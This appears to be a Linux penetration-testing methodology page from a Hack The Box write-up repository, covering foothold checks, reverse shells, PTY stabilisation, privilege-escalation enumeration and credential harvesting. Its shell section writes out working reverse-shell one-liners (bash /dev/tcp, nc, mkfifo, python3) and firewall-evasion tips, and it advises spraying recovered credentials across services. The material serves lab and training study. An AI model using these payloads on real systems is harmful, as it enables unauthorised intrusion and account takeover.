# Methodology — Linux

OS-specific technique ladder, complementing the OS-agnostic workflow in
[`../Methodology.md`](../Methodology.md). Where a technique was exercised on a **retired** HTB box
already written up in this repo, it's cross-linked for full worked detail.

---

## Foothold patterns worth checking by default

- **Anonymous/writable FTP.** Always test *write* access, not just read, when anonymous FTP login
  is allowed — if the FTP root overlaps a web server's document root, that alone is a full
  foothold (drop a web shell, request it over HTTP).
- **Legacy build/compilation daemons and similarly "convenience" network services**
  (distributed-build daemons, remote package/build tooling) frequently trust any client on the
  network by default and will run arbitrary commands with zero authentication — treat any such
  service as a top-priority target the moment it's fingerprinted. See
  [Lame](../Machines/Lame/README.md#foothold) for a fully worked example (distcc, CVE-2004-2687).
- **A backdoor deliberately planted in a compromised software release.** Occasionally a legitimate
  daemon's version string itself is the finding — a specific released version was later discovered
  to contain an intentionally inserted backdoor (supply-chain compromise of the upstream project,
  not a bug in the original code). Version-fingerprint every service and check it against known
  compromised-release advisories, not just CVE lists for coding bugs. See
  [Lame](../Machines/Lame/README.md#root-priv-escalation) (vsftpd 2.3.4, CVE-2011-2523).
- **Anonymous LDAP bind.** `ldapsearch -x` against an anonymous-bind-enabled directory can dump
  usernames and org structure with zero exploitation — treat "anonymous bind OK" in a service
  banner as a mandatory, free check before anything else on that target.

---

## Getting a shell — listener, payload, PTY upgrade

Order of operations, every time: **start the listener first**, *then* fire the payload. A payload
that connects back before anything is listening just errors out and can burn a one-shot trigger.

**1. Listener.** Default to **Penelope** — it auto-upgrades to a full PTY, logs the session, and
manages multiple shells, so it removes the manual stabilisation dance below:

```bash
penelope 443                    # listen on 443 (port is positional; see the Arsenal note in ../README.md)
```

Raw `nc` is the always-available fallback when Penelope isn't on the box:

```bash
rlwrap nc -lvnp 443             # rlwrap gives line-editing/history in the raw shell
```

Prefer a port outbound traffic is likely allowed on (**443**, 80, 53) over a random high port —
egress firewalls on the target frequently block arbitrary outbound connections but allow these.

**2. Payload.** Set `LHOST`/`LPORT` to *your* tun0 IP and the listener port. Don't assume `bash`
exists — busybox/appliance targets often only have `sh`. Have a few interpreters ready and try them
in order of what the box actually has:

```bash
# bash (most common)
bash -i >& /dev/tcp/LHOST/443 0>&1
# sh fallback (POSIX, works where bash is absent)
sh -i >& /dev/tcp/LHOST/443 0>&1
# nc with -e, or the mkfifo form when -e is compiled out
nc LHOST 443 -e /bin/sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST 443 >/tmp/f
# python3 (very common on modern Linux)
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

For anything more exotic (perl, php, socat, awk, msfvenom ELF), pull the exact string from
**revshells.com** rather than hand-writing it.

**3. Context-specific gotchas.**
- **Delivered through a web parameter / URL:** URL-encode the payload (spaces, `&`, `;`, `|`, `/`,
  `>` all break the request otherwise). A reverse shell that "does nothing" over HTTP is usually a
  quoting/encoding failure, not a blocked connection — test with a `ping`/`curl` back to yourself
  first to confirm code execution before debugging the shell payload.
- **Quoting through nested shells** (e.g. command injection inside an already-quoted string): the
  `/dev/tcp` form with `$` and `&` is the most fragile — base64-encode the whole payload and
  `echo <b64> | base64 -d | bash` to sidestep quote mangling.

**4. Stabilise a raw shell → full PTY** (skip if using Penelope — it does this automatically):

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # step 1: get a pty
export TERM=xterm                                # step 2: enable clear/less/vim
# step 3: Ctrl-Z to background, then on your box:
stty raw -echo; fg                               # re-foreground with raw local tty
# (press Enter twice) — now Ctrl-C, tab-completion, and arrow keys work
```

---

## Privilege escalation — standard enumeration order

```bash
sudo -l                                    # always first
id                                         # groups worth noting: disk, docker, lxd, adm, shadow…
find / -perm -4000 -type f 2>/dev/null     # SUID binaries
getcap -r / 2>/dev/null                    # Linux capabilities on binaries
# then a full enumeration script (LinPEAS or similar) for breadth
```

**Triage automated-enumeration output** rather than chasing every flagged line — file-mode-based
scanners flag by pattern, not actual exploitability. World-writable sockets/paths under standard
system service directories (init system, D-Bus, device manager, logging) are typically normal and
unexploitable; dismiss these on sight and focus on findings that are genuinely unusual for the
specific host.

---

## Lookup ladder for a named sudo/SUID binary

1. **A binary-abuse reference** (e.g. GTFOBins) — search the exact binary name, read the section
   matching your context (sudo / SUID / capability). This covers common binaries but not
   everything.
2. **A miss there does not mean "derive it yourself."** Search `<binary> privilege escalation` /
   `<binary> sudo exploit` — plenty of real, documented techniques exist for binaries a curated
   list hasn't caught up to.
3. **Read `--help`/man/source only as a last resort**, once every lookup source is exhausted.

**General sudo-rule pattern worth recognizing:** a `NOPASSWD` rule that pins most of a command line
but leaves a trailing wildcard, an option that accepts a path template, or a flag that can be
supplied more than once (where the last occurrence wins) often has its real escalation potential
sitting entirely in the part you're allowed to vary — never in the fixed, pinned portion (editing
that usually breaks the sudo rule match entirely, causing an unexpected password prompt). Read the
target binary's own flag documentation for exactly what the variable portion can override.

---

## Local credential harvesting

- **World-readable application config files are a first-class target.** Many self-hosted apps
  (ticketing/service-desk systems, CMSes, internal admin panels) store their own database
  credentials in a config file that's readable by more than just the service account — check
  application install directories for config files before looking for anything more exotic.
- **Local databases are almost always credential stores.** Once you have DB access, check for
  tables backing authentication integrations (LDAP/AD bind configuration, SSO settings, API
  tokens) — these often hold a *different*, more privileged account's credentials than whatever got
  you into the DB.
- **Encrypted (reversible) vs. hashed — tell them apart before choosing an attack.** A
  bcrypt/scrypt/etc.-style hash needs cracking (slow, not guaranteed). A base64-style blob sitting
  next to an application that must recover the underlying secret *at runtime* is a strong signal of
  **reversible encryption**, meaning the decryption key exists on disk somewhere the app can reach
  it. Finding that key and decrypting is faster and more reliable than cracking whenever it's
  available — always check for the reversible case first.
- **Any recovered cleartext credential gets sprayed everywhere immediately** — SSH, `su`, any other
  directory/auth service reachable — not just re-tried against the source it came from. Credentials
  tied to a service account are especially strong candidates for reuse by a real human user.

---

## Session recording (Linux-side setup)

```bash
# timestamped shell history — always-on, zero effort
# ~/.bashrc
export HISTTIMEFORMAT="%F %T "
# ~/.zshrc
setopt EXTENDED_HISTORY
```

Combine with a per-box `script -T` timed capture (see [`../Methodology.md`](../Methodology.md#session-recording--measure-your-own-speed))
for full-session replay and milestone measurement.
